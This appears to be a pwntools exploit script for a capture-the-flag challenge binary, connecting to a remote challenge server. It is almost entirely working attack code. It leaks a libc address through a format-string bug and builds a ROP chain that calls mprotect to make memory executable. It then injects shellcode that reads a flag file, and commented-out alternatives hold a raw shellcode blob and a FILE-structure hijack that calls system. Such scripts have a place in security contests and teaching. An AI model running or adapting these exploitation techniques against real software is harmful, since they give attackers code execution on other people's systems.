#!/usr/bin/env python3

from pwn import *


exe = ELF("./chall_patched", checksec=False)
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
global p

def conn():
    if args.LOCAL:
        p = process([exe.path])
        if args.GDB:
            gdb.attach(p,gdbscript='''
# b *perror_internal+13
# b *perror_internal+102
# b *($base("libc")+0x1ab46b)
# b mprotect
b *__pthread_keys
b *($base("libc")+0x1ab41b)
c
''')
            sleep(2)
    else:
        p = remote("65.109.208.98",5000)
        # p = remote("127.0.0.1",5000)
        if args.POW:
            data = p.recvregex(r's\.[A-Za-z0-9+/=]+\.[A-Za-z0-9+/=]+')
            print(data)

    return p

def set_alias(p):
    p.sla = p.sendlineafter
    p.sl = p.sendline
    p.sa = p.sendafter
    p.s = p.send
    p.ru = p.readuntil
    p.rl = p.readline
    return p

def send_generic(rbx, rbp, rip, trail=b'\n',silly=0x1337):
    p.s(flat(
        0x69420,0x17386969, # useless (?)
        rbx, # rbx
        rbp, # rbp
        rip, # rip
        silly # useless for this
    )[:-1]+trail)

def write_data(addr, data):
    send_generic(0, addr, exe.sym['main']+17)
    for i,b in enumerate(data):
        send_generic(0,addr+(i+1),exe.sym['main']+17,trail=b.to_bytes())
    send_generic(0, exe.bss()+0xf00, exe.sym['main']+17, trail=b"\x00")

def main():
    global p
    p = set_alias(conn())


    p.sl(flat(
        b'ABCDEFGH',b'ABCDEFGH',
        exe.got.read, # rbx
        exe.bss()+0xe00, # rbp
    )+b'\x11\x8a')

    # pause()
    send_generic(0,exe.bss()+0x200,exe.sym['_start'],silly=exe.sym['main'])
    # pause()
    # send_generic(0,exe.bss()+0x200,exe.sym['main']+17,silly=0x8969)
    # send_generic(0,exe.bss()+0x200,exe.sym['main']+17,silly=0x9969)
    send_generic(0,exe.bss()+0x200,exe.sym['_start']+18,silly=0x6969)
    # pause()
    send_generic(0,exe.bss()+0x200,exe.sym['_start']+24,silly=0x3352)
    send_generic(0,exe.bss()+0x200,exe.sym['_start']+24,silly=0x1492)
    send_generic(0,exe.bss()+0x200,exe.sym['_start']+24,silly=0x1492)
    p.sl(flat(
        b'!!%2$p!!',b'ABCDEFGH',
        exe.got.read, # rbx
        exe.bss()+0xe00, # rbp
    )+b'\x6a\x8a')
    p.ru(b'!!')
    leak = int(p.ru(b'!!',drop=True),16)
    libc.address = leak - (libc.sym['read']+17)
    info(f"{libc.address=:#x}")

    p.sl(flat(
        0,0,
        0, # rbx
        0, # rbp
        libc.address+0x1ab46b, # rip1, just increment rdx a bunch
        libc.sym['read'] # rip2, now that rdx is high free stack overflow :D
    )[:-1])

    r = ROP([exe,libc])
    r.rax = exe.bss()+0x500
    r.raw(libc.address+0x1449ba)
    r.raw(7)
    r.mprotect(0x404000,0x1000) # cant find rdx gadget because its dumb :( (so we do it down bdelow)

    r.raw(fun)
    r.read(0,exe.bss()+0x50)
    # r.gets(exe.bss()+0x50)
    r.raw(libc.address+0x1ab41b)
    r.raw(exe.bss()+0x50)

    # sys
    # shellcode = bytes.fromhex("488bece81a0000006a3c580f05565755488bec8bf86a02588bf28bd10f05c95f5ec3565755488bec488da42400f0ffff488d053b000000ba0000010033c9e8caffffff8bf8488db500f0ffffb8d9000000ba001000000f0548c7c00100000048c7c7010000004889e648c7c2e80300000f052e000000")
    shellcode = asm(shellcraft.cat2("./flag-dae7cb7f09d632efcb5289af8d69a0ae.txt"))

    p.sl(b'A'*49+r.chain())
    # p.sl(cyclic(200))
    sleep(1)
    p.sl(shellcode)

    # file = io_file.IO_FILE_plus_struct()
    # payload = file.house_of_apple2_execmd_when_do_IO_operation(
    # libc.sym['_IO_2_1_stdout_'],
    # libc.sym['_IO_wfile_jumps'],
    # libc.sym['system'])

    # write_data(libc.sym['_IO_2_1_stdout_'],payload)

    p.interactive() # PLIMB's up!

if __name__ == "__main__":
    main()
